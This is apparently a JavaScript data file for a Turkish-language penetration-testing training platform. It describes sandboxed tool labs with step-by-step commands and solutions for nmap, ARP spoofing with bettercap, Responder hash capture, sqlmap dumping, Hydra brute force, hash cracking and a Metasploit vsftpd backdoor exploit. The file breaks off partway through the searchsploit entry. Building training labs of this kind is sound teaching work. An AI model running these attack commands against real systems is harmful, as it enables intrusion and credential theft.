// ============================================================================
//  app/toolLabData.js — GERÇEK ARAÇ LABLARI (CLIENT-SAFE METADATA).
//  Her araç kendi "ana modül"ü: gerçek bir saldırgan kutusu (Kali tabanlı, gerçek
//  ikililer + tarayıcı terminali) + izole zafiyetli hedef(ler). Öğrenci aracı
//  GERÇEKTEN çalıştırarak flag'i yakalar.
//
//  ⚠ FLAG YOK — kanonik flag'ler yalnız sunucu-only lib/flags.js'te.
//  ⚠ Konteyner imajı / cap / ağ gibi orkestrasyon ayrıntıları sunucu-only
//     lib/toolLabs.js'tedir. Burası yalnız öğrenciye gösterilen anlatımdır.
//
//  Alanlar:
//    slug      → katalog/flag/manifest ortak anahtarı
//    icon,name → yol haritası modül başlığı
//    cat       → pedagojik kategori (recon | traffic | web | password | exploit | social)
//    intro     → modül kartı açıklaması (yol haritasında)
//    story     → senaryo (neden/ne yapacaksın)
//    objectives→ adım adım görevler
//    targets   → lab ağındaki hedef hostname'ler + not (öğrenci bunları hedefler)
//    cmds      → başlangıç için örnek komutlar (terminalde gerçekten çalışır)
//    hints     → kademeli ipuçları (spoiler)
//    solution  → tam çözüm (spoiler)
//    flagHint  → flag'i nereden/nasıl alacağı
//    gui       → true ise "🖥 Masaüstü" (noVNC: Wireshark/Burp/BeEF) gerekir
// ============================================================================

export const TOOL_LABS = {
  /* ───────────────────────── TEMEL (SSH'li kutu-lab, Bandit-tarzı) ───────────────────────── */
  "tool-linux": {
    icon: "🐧", name: "Linux Temelleri — İnteraktif", cat: "temel", ssh: true, interactive: true,
    intro: "İzole bir Linux makinesine KENDİ sanal makinenden SSH ile bağlan; Bandit tarzı soruları adım adım çözerek temel komutları öğren ve son adımda flag'i çıkar.",
    story: "Tüm saldırı araçları Linux terminalinde yaşar. Bu lab için izole bir Linux hedefi başlatılır; sen KENDİ sanal makinenden (Kali/Linux) `ssh ordek@<hedef-ip>` ile bağlanırsın (parola panelde). Bağlandıktan sonra OverTheWire Bandit tarzında: her doğru cevap bir sonraki soruyu açar. pwd/ls/cat/grep gibi temel komutlarla dosya sisteminde gezinip ipuçlarını takip edecek, son adımda gizli base64 değeri çözüp flag'i ortaya çıkaracaksın.",
    objectives: [
      "Kendi VM'inden hedefe SSH ile bağlan (ssh ordek@<ip>)",
      "Dosya sisteminde gez ve listele (whoami, pwd, ls)",
      "İpucu dosyalarını oku ve gizli dizini takip et (cat, grep)",
      "Gizli base64 değeri çöz → flag'i ortaya çıkar (base64 -d)",
    ],
    targets: [{ host: "target", note: "izole Linux makinesi — SSH (kullanıcı: ordek, parola: ordek)" }],
    cmds: [
      "ssh ordek@<hedef-ip>        # parola: ordek (panelde gösterilir)",
      "whoami; pwd; ls",
      "cat notlar/ipucu.txt        # gizli dizini söyler",
      "base64 -d veriler/gizli.b64 # ← FLAG burada çıkar",
    ],
    hints: [
      "Bağlandıktan sonra `ls` ve `cat` ile dizinleri keşfet; ipucu dosyaları seni gizli dosyaya götürür.",
      "Son adımda `base64 -d veriler/gizli.b64` çıktısı doğrudan flag'tir.",
    ],
    solution: "ssh ordek@<ip> (parola: ordek) → whoami=ordek, pwd=/home/ordek, ls=4 öğe → `cat notlar/ipucu.txt` gizli dizinin 'veriler' olduğunu söyler → `ls veriler` → gizli.b64 → `base64 -d veriler/gizli.b64` flag'i (ordek{...}) yazar.",
    flagHint: "Flag = hedefte `base64 -d veriler/gizli.b64` ile çözdüğün ordek{...} değeridir.",
    gui: false,
  },

  /* ───────────────────────── KEŞİF (recon) ───────────────────────── */
  "tool-nmap": {
    icon: "📡", name: "Nmap — Port & Servis Keşfi", cat: "recon", interactive: true,
    intro: "Gerçek nmap ile bir hedefin açık portlarını, servislerini ve sürümlerini haritalandır; gizli yüksek portu bul.",
    story: "Saldırının ilk adımı keşiftir: 'nereye saldırabilirim?'. Hedef sunucu birkaç servis çalıştırıyor ama biri standart taramada görünmüyor. Gerçek nmap ile tüm portları tara, gizli servisi ve banner'ındaki flag'i ortaya çıkar.",
    objectives: [
      "`nmap -sV 10.13.37.10` ile açık servisleri ve sürümlerini listele",
      "Standart taramada görünmeyen gizli yüksek portu bulmak için tüm portları tara (`-p-`)",
      "Gizli servisin banner'ını oku (`-sV` / `nc`) ve içindeki flag'i yakala",
    ],
    targets: [{ host: "target", ip: "10.13.37.10", note: "zafiyetli sunucu (10.13.37.10) — birkaç servis + gizli port 31337" }],
    cmds: [
      "nmap -sV 10.13.37.10              # servis/sürüm tespiti (gizli port görünmez)",
      "nmap -p- --min-rate 2000 10.13.37.10   # 65535 portun hepsini tara",
      "nmap -sV -p31337 10.13.37.10     # gizli servisin banner'ını oku",
    ],
    hints: ["Gizli servis 1024 üstü bir portta; varsayılan tarama yalnız yaygın portlara bakar.", "`-p-` tüm portları tarar; açık çıkan beklenmedik portu `-sV` ile banner'la."],
    solution: "`nmap -p- 10.13.37.10` ile 31337'nin açık olduğunu gör, sonra `nmap -sV -p31337 10.13.37.10` (veya `nc 10.13.37.10 31337`) ile banner'ı oku — flag banner içindedir.",
    flagHint: "Flag, gizli servisin (port 31337) banner'ında yazılıdır.",
    gui: false,
  },
  "tool-dnsrecon": {
    icon: "🌐", name: "DNS Recon — Zone Transfer & Subdomain", cat: "recon", interactive: true,
    intro: "dnsrecon/dnsenum ile yanlış yapılandırılmış bir DNS sunucusundan zone transfer (AXFR) çekip gizli subdomain'leri keşfet.",
    story: "DNS sunucuları, yetkisiz 'zone transfer'a (AXFR) izin verirse tüm alan adı kayıtlarını ele verir. Hedef DNS bu hatayı yapıyor. Tüm kayıtları çek, gizli bir subdomain'in TXT kaydındaki flag'i bul.",
    objectives: [
      "Hedef DNS sunucusunu (`target`) sorgula",
      "Zone transfer (AXFR) dene ve tüm kayıtları dök",
      "Gizli subdomain'in TXT kaydındaki flag'i oku",
    ],
    targets: [{ host: "target", note: "AXFR'a açık DNS sunucusu (bind/dnsmasq)" }],
    cmds: [
      "dnsrecon -d ordek.lab -n target -t axfr",
      "dig @target ordek.lab AXFR",
      "dnsenum --dnsserver target ordek.lab",
    ],
    hints: ["`dig @target <domain> AXFR` tüm zone'u döker.", "Flag bir TXT kaydında saklı — kayıtları dikkatle oku."],
    solution: "`dig @target ordek.lab AXFR` ile zone'u dök; gizli `flag.ordek.lab` TXT kaydında flag yer alır.",
    flagHint: "Flag, zone içindeki gizli bir subdomain'in TXT kaydındadır.",
    gui: false,
  },
  "tool-theharvester": {
    icon: "🔎", name: "theHarvester — OSINT Toplama", cat: "recon", loot: true, interactive: true,
    intro: "theHarvester ile bir kurumun e-posta adreslerini ve subdomain'lerini açık kaynaklardan (yerel ayna) topla.",
    story: "Hedefe hiç dokunmadan, açık kaynaklardan e-posta ve subdomain toplamak (OSINT) saldırının sessiz ayağıdır. theHarvester'ı lab içi yerel veri kaynağına yönlendir; toplanan kayıtlardan birinde flag gizli.",
    objectives: [
      "theHarvester'ı `ordek.lab` domain'i için çalıştır",
      "Toplanan e-posta ve host listesini incele",
      "Kayıtlar arasına saklanmış flag'i bul",
    ],
    targets: [{ host: "target", note: "yerel OSINT veri kaynağı (offline ayna)" }],
    cmds: [
      "# 'Loot dosyasını indir' (osint.txt) butonunu kullan, sonra kendi terminalinde:",
      "cat osint.txt | grep ordek",
      "# (kendi Kali'nde gerçek araç: theHarvester -d ordek.lab -b duckduckgo -l 100)",
    ],
    hints: ["İndirdiğin osint.txt'teki host kayıtlarını tara.", "Flag bir 'sahte' host kaydının adına gömülü; `grep ordek` ile bul."],
    solution: "osint.txt'i indir, `grep ordek osint.txt` → `<flag>.ordek.lab` kaydındaki flag.",
    flagHint: "Flag, toplanan host kayıtlarından birinin adına gömülüdür.",
    gui: false,
  },
  "tool-ffuf": {
    icon: "📂", name: "ffuf / gobuster — İçerik Keşfi", cat: "recon", interactive: true,
    intro: "ffuf veya gobuster ile bir web sunucusunda gizlenmiş dizin ve dosyaları (yönetim paneli, yedek) fuzzing ile bul.",
    story: "Web uygulamalarının görünmeyen kısımları vardır: gizli yönetim panelleri, yedek dosyalar. Bir kelime listesiyle hızla deneyerek (`FUZZ`) gizli `/admin` dizinini bul; içinde flag var.",
    objectives: [
      "`target`'ın kök dizinini ve robots.txt'i incele",
      "ffuf/gobuster ile bir wordlist'le dizinleri fuzz et",
      "Gizli yönetim dizinini bul ve flag'i oku",
    ],
    targets: [{ host: "target", note: "HTTP sunucusu — gizli /admin-xxxx dizini" }],
    cmds: [
      "ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt",
      "gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt",
      "curl http://target/robots.txt",
    ],
    hints: ["robots.txt çoğu zaman 'gizlenmek isteneni' ele verir.", "200/301 dönen beklenmedik bir yolu tarayıcıda/curl ile ziyaret et."],
    solution: "`ffuf` ile gizli dizini bul (robots.txt ipucu verir), `curl http://target/<gizli>/flag.txt` ile flag'i oku.",
    flagHint: "Flag, fuzzing ile bulunan gizli dizindeki bir dosyadadır.",
    gui: false,
  },
  "tool-nikto": {
    icon: "🩺", name: "Nikto — Web Sunucu Taraması", cat: "recon", interactive: true,
    intro: "Nikto ile bir web sunucusunu tarayıp tehlikeli dosyalar, eski yazılım ve yanlış yapılandırmaları tespit et.",
    story: "Nikto, bilinen tehlikeli dosyaları, açık dizinleri ve sunucu yanlış yapılandırmalarını otomatik tarar. Hedefi tara; bulunan ilginç bir dosya/başlık flag'e götürür.",
    objectives: [
      "`nikto -h http://target` ile tam tarama yap",
      "Raporda işaretlenen ilginç dosya/başlığı incele",
      "Yanlış yapılandırmadan sızan flag'i oku",
    ],
    targets: [{ host: "target", note: "yanlış yapılandırılmış HTTP sunucusu" }],
    cmds: [
      "nikto -h http://target",
      "curl -I http://target/    # başlıkları incele",
    ],
    hints: ["Nikto çıktısındaki 'interesting file' / açık dizin satırlarına bak.", "Flag bir yedek dosyada ya da özel bir HTTP başlığında olabilir."],
    solution: "Nikto'nun işaret ettiği açık dosyayı/başlığı `curl` ile aç; flag oradadır.",
    flagHint: "Flag, Nikto'nun bulduğu yanlış-yapılandırılmış bir dosya/başlıktadır.",
    gui: false,
  },
  "tool-smb": {
    icon: "🗂️", name: "SMB Enum — enum4linux & smbclient", cat: "recon", interactive: true,
    intro: "enum4linux ve smbclient ile bir Samba sunucusunu numaralandır; anonim erişilebilir paylaşımdaki gizli dosyayı çek.",
    story: "Kurumsal ağlarda Samba paylaşımları sık sık yanlış yapılandırılır: anonim (guest) erişim açık kalır. Hedef Samba'yı numaralandır, açık paylaşımı bul ve içindeki dosyayı indir — flag orada.",
    objectives: [
      "`enum4linux-ng -A target` ile paylaşımları ve kullanıcıları listele",
      "Anonim erişimli paylaşıma `smbclient` ile bağlan",
      "Paylaşımdaki dosyayı indir ve flag'i oku",
    ],
    targets: [{ host: "target", note: "Samba — anonim erişimli 'public' paylaşımı" }],
    cmds: [
      "enum4linux-ng -A target",
      "smbclient -L //target -N           # paylaşımları listele (anonim)",
      "smbclient //target/public -N       # bağlan, sonra: get flag.txt",
    ],
    hints: ["`smbclient -L //target -N` anonim paylaşımları listeler.", "Paylaşıma girince `ls` ve `get <dosya>` kullan."],
    solution: "`smbclient //target/public -N` ile bağlan, `get flag.txt`, sonra yerelde oku.",
    flagHint: "Flag, anonim Samba paylaşımındaki bir dosyadadır.",
    gui: false,
  },
  "tool-wpscan": {
    icon: "📝", name: "WPScan — WordPress Zafiyet Taraması", cat: "recon", interactive: true,
    intro: "WPScan ile bir WordPress sitesinin kullanıcılarını ve zafiyetli eklentilerini numaralandır.",
    story: "WordPress, eklenti zafiyetleri ve sıralanabilir kullanıcılarla doludur. Hedef WP sitesini WPScan ile tara; kullanıcıları ve zafiyetli eklentiyi tespit et — bulgulardan biri flag'e götürür.",
    objectives: [
      "`wpscan --url http://target` ile genel tarama",
      "Kullanıcıları (`-e u`) ve eklentileri (`-e ap`) numaralandır",
      "Zafiyetli eklenti / açık dosyadan flag'i çıkar",
    ],
    targets: [{ host: "target", note: "WordPress + zafiyetli eklenti + sıralanabilir kullanıcılar" }],
    cmds: [
      "wpscan --url http://target -e u,ap --plugins-detection aggressive",
      "curl http://target/wp-content/plugins/   # dizin listeleme açık mı?",
    ],
    hints: ["`-e u` kullanıcı adlarını sızdırır; `-e ap` tüm eklentileri yoklar.", "Zafiyetli eklentinin dosyalarından birinde flag var."],
    solution: "WPScan ile zafiyetli eklentiyi bul; eklenti dizinindeki açık dosyadan (ör. readme/log) flag'i oku.",
    flagHint: "Flag, zafiyetli eklentinin açıkta kalan bir dosyasındadır.",
    gui: false,
  },

  /* ───────────────────────── TRAFİK / MITM (traffic) ───────────────────────── */
  "tool-wireshark": {
    icon: "🦈", name: "Wireshark — Paket Yakalama & Analiz", cat: "traffic", interactive: true,
    intro: "GERÇEK Wireshark ile ağı dinle; HTTP'li bir sitede doldurulan login formunun düz metin parolasını yakala.",
    story: "HTTP (şifresiz) trafikte parolalar düz metin gider. Ağda bir 'kurban' (victim) periyodik olarak HTTP'li siteye giriş yapıyor. Wireshark'ı aç, trafiği yakala, `http` filtresiyle login POST'unu bul ve 'Follow HTTP Stream' ile düz metin parolayı oku. O parola flag'in ta kendisi.",
    objectives: [
      "🖥 Masaüstünden Wireshark'ı aç ve `eth0` arayüzünde yakalamayı başlat",
      "`http` filtresini uygula; kurbanın `/login` POST isteğini bul",
      "'Follow > HTTP Stream' ile `username=...&password=...` satırını oku",
      "Yakaladığın düz metin parolayı flag olarak gönder",
    ],
    targets: [
      { host: "target", note: "HTTP (TLS yok) login sitesi" },
      { host: "victim", note: "kurban bot — periyodik HTTP login yapar (yakalanacak trafik)" },
    ],
    cmds: [
      "# Terminalden de yapılabilir (Wireshark yoksa):",
      "tshark -i eth0 -Y http.request -T fields -e http.file_data",
      "tshark -i eth0 -f 'tcp port 80' -Y 'http.request.method==POST'",
    ],
    hints: ["Kurban ~10 sn'de bir giriş yapıyor; birkaç saniye yakala.", "POST gövdesinde `password=` alanını ara; değeri olduğu gibi flag'tir."],
    solution: "Wireshark'ta `http.request.method == POST` filtrele → `/login` paketinde sağ tık → Follow > HTTP Stream → `password=ordek{...}` satırını oku; o değeri flag olarak gönder.",
    flagHint: "Flag = kurbanın HTTP login formunda gönderdiği düz metin paroladır.",
    gui: true,
  },
  "tool-tcpdump": {
    icon: "📥", name: "tcpdump — CLI Paket Yakalama", cat: "traffic", interactive: true,
    intro: "tcpdump ile komut satırından paket yakala, bir .pcap dosyasına kaydet ve filtreleyerek gizli veriyi çıkar.",
    story: "GUI olmadan, sadece terminalden trafik yakalamak gerçek sahada şarttır. tcpdump ile kurbanın HTTP trafiğini bir .pcap'e kaydet, sonra filtreyle login verisini ayıkla.",
    objectives: [
      "`tcpdump -i eth0 -w capture.pcap` ile yakala (birkaç saniye)",
      "`tcpdump -r capture.pcap -A` ile içeriği oku",
      "HTTP POST gövdesindeki flag'i bul",
    ],
    targets: [
      { host: "target", note: "HTTP login sitesi" },
      { host: "victim", note: "kurban bot — HTTP trafiği üretir" },
    ],
    cmds: [
      "tcpdump -i eth0 -w /root/capture.pcap 'tcp port 80'",
      "tcpdump -r /root/capture.pcap -A | grep -i password",
    ],
    hints: ["`-A` paketleri ASCII gösterir; `grep password` ile daralt.", "Yakalamayı Ctrl-C ile durdurmadan önce kurbanın bir giriş yapmasını bekle."],
    solution: "`tcpdump -i eth0 -w cap.pcap tcp port 80`, kurban giriş yapınca durdur, `tcpdump -r cap.pcap -A | grep password` → flag.",
    flagHint: "Flag = .pcap içindeki HTTP POST gövdesinden çıkan paroladır.",
    gui: false,
  },
  "tool-bettercap": {
    icon: "🕷️", name: "bettercap — ARP Spoof MITM", cat: "traffic", interactive: true,
    intro: "bettercap ile ARP zehirlemesi yaparak kurban ile sunucu arasına gir (MITM) ve trafiğini yakala.",
    story: "Aynı ağdaki bir saldırgan, ARP zehirlemesiyle kendini 'ortadaki adam' yapabilir: kurbanın tüm trafiği önce sana uğrar. bettercap ile kurbanı zehirle, HTTP trafiğini yakala ve kimlik bilgilerini çal.",
    objectives: [
      "bettercap'i başlat, ağı keşfet (`net.probe on`)",
      "Kurbanı ARP-spoof'la (`arp.spoof`) ve `net.sniff on` ile dinle",
      "Yakalanan HTTP kimlik bilgisindeki flag'i oku",
    ],
    targets: [
      { host: "target", note: "HTTP sunucusu" },
      { host: "victim", note: "kurban bot — sunucuya HTTP login yapar" },
    ],
    cmds: [
      "bettercap -iface eth0",
      "  net.probe on",
      "  set arp.spoof.targets victim; arp.spoof on",
      "  set net.sniff.verbose true; net.sniff on",
    ],
    hints: ["Önce `net.probe on` ile victim'in IP'sini öğren.", "`net.sniff on` HTTP POST kimlik bilgilerini yazdırır."],
    solution: "bettercap'te victim'i arp.spoof'la, net.sniff ile HTTP login'i yakala; sniff çıktısındaki parola = flag.",
    flagHint: "Flag = MITM ile yakalanan HTTP login parolasıdır.",
    gui: false,
  },
  "tool-responder": {
    icon: "👻", name: "Responder — LLMNR/NBT-NS Zehirleme", cat: "traffic", interactive: true,
    intro: "Responder ile LLMNR/NBT-NS isteklerine sahte yanıt ver, kurbanın NetNTLM hash'ini yakala ve john ile kır.",
    story: "Windows ağlarında bir isim çözülemediğinde LLMNR/NBT-NS yayını yapılır. Responder bu yayınlara sahte cevap verip kurbanın kimlik doğrulamasını kendine çeker ve NetNTLMv2 hash'ini yakalar. Hash'i yakala, john ile kır — kırılan parola flag.",
    objectives: [
      "`responder -I eth0` ile dinlemeye başla",
      "Kurban yanlış bir isme erişmeye çalışınca NetNTLM hash'ini yakala",
      "Hash'i `john` ile kır; parola = flag",
    ],
    targets: [
      { host: "victim", note: "kurban bot — periyodik olarak var olmayan bir paylaşıma erişir (LLMNR yayını)" },
    ],
    cmds: [
      "responder -I eth0 -wv",
      "# yakalanan hash genelde /usr/share/responder/logs/ altında",
      "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
    ],
    hints: ["Kurban birkaç saniyede bir erişim deniyor; Responder'ı açık bırak.", "Yakalanan hash dosyasını john'a rockyou ile ver."],
    solution: "Responder hash'i yakalar (logs/), `john --wordlist=rockyou.txt <hash>` ile kır; kırılan parola flag'tir.",
    flagHint: "Flag = yakalanan NetNTLM hash'inin john ile kırılmış parolasıdır.",
    gui: false,
  },

  /* ───────────────────────── WEB SÖMÜRÜ (web) ───────────────────────── */
  "tool-burp": {
    icon: "🧰", name: "Burp Suite — Intercept & Repeater", cat: "web", interactive: true,
    intro: "GERÇEK Burp Suite ile istekleri yakala (intercept) ve Repeater'da değiştirerek istemci-tarafı kontrolü atlat.",
    story: "Burp Suite, tarayıcı ile sunucu arasına giren proxy'dir. Bir alışveriş sayfasında fiyat istemci tarafında 'sabit' görünür ama sunucuya gönderilmeden Burp'te durdurulup değiştirilebilir. Fiyatı 0/1'e indir, iş mantığı açığını sömür — sunucu flag ile yanıt verir.",
    objectives: [
      "🖥 Masaüstünden Burp'ü aç; tarayıcıyı Burp proxy'sine yönlendir (127.0.0.1:8080)",
      "`http://target` sipariş isteğini Intercept ile yakala",
      "Repeater'a gönder; gizli `price` alanını değiştir ve tekrar gönder",
      "Sunucunun döndürdüğü flag'i oku",
    ],
    targets: [{ host: "target", note: "alışveriş uygulaması — fiyat sunucuda doğrulanmıyor" }],
    cmds: [
      "# GUI: Burp > Proxy > Intercept on; Firefox proxy 127.0.0.1:8080",
      "# Repeater'da: price alanını 1 yap, Send.",
    ],
    hints: ["İsteği yakalayıp Repeater'a (Ctrl-R) gönder.", "`price` veya `total` alanını küçült; sunucu kontrol etmiyor."],
    solution: "Sipariş isteğini Burp'te yakala, Repeater'da `price=1` yap, gönder; yanıt gövdesinde flag döner.",
    flagHint: "Flag, manipüle edilmiş siparişe sunucunun verdiği yanıttadır.",
    gui: true,
  },
  "tool-sqlmap": {
    icon: "💉", name: "sqlmap — Otomatik SQL Injection", cat: "web", interactive: true,
    intro: "sqlmap ile bir SQL injection açığını otomatik sömür; veritabanını dump et ve gizli tablodaki flag'i çıkar.",
    story: "Manuel SQLi yorucu olabilir; sqlmap bunu otomatikleştirir. Hedefteki zafiyetli parametreyi sqlmap'e ver; veritabanını dök, gizli bir tablodaki flag'i çıkar.",
    objectives: [
      "Zafiyetli endpoint'i tespit et (`/product?id=1`)",
      "`sqlmap -u ... --dbs` ile veritabanlarını listele",
      "Gizli tabloyu dump et (`--dump`) ve flag'i oku",
    ],
    targets: [{ host: "target", note: "SQL injection'a açık ürün arama endpoint'i" }],
    cmds: [
      "sqlmap -u 'http://target/product?id=1' --batch --dbs",
      "sqlmap -u 'http://target/product?id=1' --batch -D ordek --tables",
      "sqlmap -u 'http://target/product?id=1' --batch -D ordek -T secrets --dump",
    ],
    hints: ["`--batch` tüm soruları varsayılanla geçer.", "Flag `secrets` benzeri gizli bir tabloda."],
    solution: "`sqlmap -u 'http://target/product?id=1' --batch -D ordek -T secrets --dump` → flag tablo satırında.",
    flagHint: "Flag, dump edilen gizli DB tablosundaki bir satırdadır.",
    gui: false,
  },
  "tool-beef": {
    icon: "🥩", name: "BeEF — Tarayıcı Sömürü Çatısı", cat: "web",
    intro: "BeEF ile bir kurbanın tarayıcısını 'hookla'; hooklu tarayıcıda komut çalıştır ve bilgi sız.",
    story: "BeEF, bir XSS/hook script'i çalıştıran tarayıcıyı uzaktan kontrol etmeni sağlar. Kurban bot, hook'lu bir sayfayı geziyor. BeEF panelinde hook'lu tarayıcıyı gör, bir komut modülü çalıştır ve kurbandan flag'i sız.",
    objectives: [
      "🖥 Masaüstünden BeEF panelini aç (http://127.0.0.1:3000/ui/panel)",
      "Kurban tarayıcısının 'Online Browsers'da belirmesini bekle",
      "Bir komut modülü (ör. Get Cookie) çalıştır ve flag'i topla",
    ],
    targets: [
      { host: "victim", note: "kurban bot — BeEF hook'lu sayfayı periyodik gezer" },
    ],
    cmds: [
      "# BeEF arka planda çalışır. Panel: http://127.0.0.1:3000/ui/panel",
      "# Giriş: beef / beef",
    ],
    hints: ["Kurban birkaç saniyede bir hook sayfasını ziyaret ediyor.", "Hook'lu oturumda 'Get Cookies' modülü flag çerezini sızdırır."],
    solution: "BeEF panelinde hook'lu tarayıcıyı seç, Commands > Get Cookie çalıştır; çıktıdaki `flag` çerezi flag'tir.",
    flagHint: "Flag, hook'lu kurban tarayıcısının bir çerezinde/DOM'undadır.",
    gui: true,
  },

  /* ───────────────────────── PAROLA (password) ───────────────────────── */
  "tool-hydra": {
    icon: "🐉", name: "Hydra — Online Brute Force", cat: "password", interactive: true,
    intro: "Hydra ile bir login formuna sözlük saldırısı yap; zayıf admin parolasını kır ve panele gir.",
    story: "Hız sınırı/kilitleme olmayan giriş formları sözlük saldırısına açıktır. Hydra'ya kullanıcı adını ve bir parola listesini ver; doğru parolayı bulsun. Doğru parolayla giriş yapınca panel flag'i gösterir.",
    objectives: [
      "Login formunun alan adlarını ve 'başarısız' mesajını tespit et",
      "Hydra http-post-form modülüyle rockyou'yu dene",
      "Bulunan parolayla giriş yap ve flag'i gör",
    ],
    targets: [{ host: "target", note: "hız sınırı zayıf login formu (kullanıcı: admin)" }],
    cmds: [
      "hydra -l admin -P /usr/share/wordlists/rockyou.txt target -s 80 \\",
      "  http-post-form '/login:username=^USER^&password=^PASS^:Hatalı'",
      "curl -d 'username=admin&password=<bulunan>' http://target/login",
    ],
    hints: ["Başarısız yanıttaki metni (ör. 'Hatalı') Hydra'ya 'fail' işareti olarak ver.", "Parola yaygın bir rockyou kelimesi."],
    solution: "Hydra http-post-form ile admin parolasını kır, o parolayla `/login`'e POST at; başarılı girişte flag döner.",
    flagHint: "Flag, doğru parolayla giriş yapınca sunucunun döndürdüğü sayfadadır.",
    gui: false,
  },
  "tool-john": {
    icon: "🔓", name: "John the Ripper — Hash Kırma", cat: "password", loot: true, interactive: true,
    intro: "John the Ripper ile ele geçirilmiş bir /etc/shadow hash'ini sözlük saldırısıyla kır.",
    story: "Bir sunucudan shadow dosyasını ele geçirdin. Parolalar hash'li ama zayıf. John the Ripper + rockyou ile hash'i kır; bulunan parola flag.",
    objectives: [
      "Ele geçirilmiş hash dosyasını incele (`/root/loot/shadow.txt`)",
      "`john --wordlist=rockyou` ile kır",
      "Kırılan parolayı (`john --show`) flag olarak gönder",
    ],
    targets: [{ host: "(yerel)", note: "hash dosyası saldırgan kutusunda /root/loot/shadow.txt" }],
    cmds: [
      "# 'Loot dosyasını indir' (hashes.txt) ve 'Sözlük' (wordlist.txt) butonlarını kullan, sonra:",
      "john --format=Raw-MD5 --wordlist=wordlist.txt hashes.txt",
      "john --format=Raw-MD5 --show hashes.txt",
    ],
    hints: ["Hash Raw-MD5; indirdiğin wordlist.txt'i kullan.", "`john --show` kırılan parolayı (=flag) gösterir."],
    solution: "İndir → `john --format=Raw-MD5 --wordlist=wordlist.txt hashes.txt` → `john --show` → kırılan değer flag'tir.",
    flagHint: "Flag = john'un kırdığı shadow parolasıdır.",
    gui: false,
  },
  "tool-hashcat": {
    icon: "⚡", name: "hashcat — Hash Kırma (CPU)", cat: "password", loot: true, interactive: true,
    intro: "hashcat ile ele geçirilmiş bir MD5 hash'ini sözlük saldırısıyla kır (CPU modu).",
    story: "hashcat en hızlı kırma aracıdır. Saldırgan kutusunda ele geçirilmiş bir MD5 hash'i var. Doğru mod (`-m 0` MD5) ve verilen sözlükle hash'i kır; bulunan parola flag.",
    objectives: [
      "Hash dosyasını incele (`/root/loot/hash.txt`)",
      "`hashcat -m 0 -a 0` ile sözlüğü dene",
      "Kırılan parolayı (`--show`) flag olarak gönder",
    ],
    targets: [{ host: "(yerel)", note: "MD5 hash saldırgan kutusunda /root/loot/hash.txt" }],
    cmds: [
      "# 'Loot dosyasını indir' (hash.txt) ve 'Sözlük' (wordlist.txt) butonlarını kullan, sonra:",
      "hashcat -m 0 -a 0 hash.txt wordlist.txt",
      "hashcat -m 0 hash.txt --show",
    ],
    hints: ["MD5 için mod `-m 0`.", "İndirdiğin wordlist.txt'i kullan; GPU yoksa `--force` ekle."],
    solution: "İndir → `hashcat -m 0 -a 0 hash.txt wordlist.txt` → `hashcat -m 0 hash.txt --show` → kırılan değer flag'tir.",
    flagHint: "Flag = hashcat'in kırdığı MD5 parolasıdır.",
    gui: false,
  },
  "tool-aircrack": {
    icon: "📶", name: "Aircrack-ng — WPA2 El Sıkışma Kırma", cat: "password", loot: true, interactive: true,
    intro: "Aircrack-ng ile yakalanmış bir WPA2 4-way handshake (.cap) dosyasını sözlükle kır.",
    story: "WiFi WPA2 parolaları, yakalanan 4-way handshake'e karşı offline kırılabilir. (Docker'da radyo yok; sana gerçek bir handshake .cap dosyası verildi.) Aircrack-ng + wordlist ile WPA anahtarını kır; anahtar flag.",
    objectives: [
      "Verilen handshake'i incele (`/root/loot/handshake.cap`)",
      "`aircrack-ng -w rockyou handshake.cap` ile kır",
      "Bulunan WPA anahtarını flag olarak gönder",
    ],
    targets: [{ host: "(yerel)", note: "WPA2 handshake .cap saldırgan kutusunda /root/loot/handshake.cap" }],
    cmds: [
      "# 'Loot dosyasını indir' (handshake.cap) + 'Sözlük' (wordlist.txt), sonra kendi Kali'nde:",
      "aircrack-ng handshake.cap              # ESSID'i gör",
      "aircrack-ng -w wordlist.txt handshake.cap",
    ],
    hints: ["Önce ESSID'i listele, sonra wordlist ver.", "İndirdiğin wordlist.txt'i kullan; anahtar 'KEY FOUND' satırında çıkar — o değer flag'tir."],
    solution: "handshake.cap + wordlist.txt indir → `aircrack-ng -w wordlist.txt handshake.cap` → 'KEY FOUND! [ ordek{...} ]'.",
    flagHint: "Flag = aircrack-ng'in bulduğu WPA2 anahtarıdır.",
    gui: false,
  },

  /* ───────────────────────── EXPLOIT (exploit) ───────────────────────── */
  "tool-metasploit": {
    icon: "🎯", name: "Metasploit — Servis Exploit & Meterpreter", cat: "exploit", interactive: true,
    intro: "Metasploit ile bilinen bir CVE'ye sahip servisi sömür; meterpreter/shell oturumu açıp flag'i oku.",
    story: "Hedef, bilinen bir açığa sahip eski bir servis çalıştırıyor. msfconsole'da uygun exploit modülünü seç, RHOSTS'u ayarla ve çalıştır; bir shell oturumu açılınca hedefteki flag dosyasını oku.",
    objectives: [
      "`nmap -sV target` ile zafiyetli servis sürümünü tespit et",
      "msfconsole'da uygun exploit modülünü `search` et ve `use` et",
      "`set RHOSTS target` + `run`; oturum açılınca flag'i oku",
    ],
    targets: [{ host: "target", note: "bilinen CVE'li eski servis (ör. vsftpd 2.3.4 backdoor)" }],
    cmds: [
      "msfconsole -q",
      "  search vsftpd 2.3.4",
      "  use exploit/unix/ftp/vsftpd_234_backdoor",
      "  set RHOSTS target; run",
      "  cat /root/flag.txt",
    ],
    hints: ["Servis sürümünü nmap -sV ile öğren, modülü ona göre seç.", "Oturum açılınca `cat /root/flag.txt`."],
    solution: "vsftpd 2.3.4 backdoor modülünü kullan, RHOSTS=target, run; açılan shell'de `cat /root/flag.txt` → flag.",
    flagHint: "Flag, exploit sonrası hedefte /root/flag.txt içindedir.",
    gui: false,
  },
  "tool-searchsploit": {
    icon: "🗃️", name: "SearchSploit — Public Exploit Bulma", cat: "exploit", interactive: true,
    intro: "SearchSploit (Exploit-DB) ile tespit ettiğin servis sürümüne uygun public exploit'i bul ve çalıştır.",
    story: "Bir servis sürümü tespit ettin. SearchSploit, Exploit-DB'nin offline kopyasında o sürüme ait hazır exploit'leri arar. Doğru exploit'i bul, kopyala, çalıştır ve flag'i al.",
    objectives: [
      "Servis sürümünü tespit et (`nmap -sV target`)",
      "`searchsploit <servis> <sürüm>` ile exploit bul",
      "Exploit'i mirror'la (`-m`), çalıştır ve flag'i oku",
    ],
    targets: [{ host: "target", note: "Exploit-DB'de kayıtlı CVE'li servis" }],
    cmds: [
      "searchsploit vsftpd 2.3.4",
      "searchsploit -m unix/remote/49757.py",
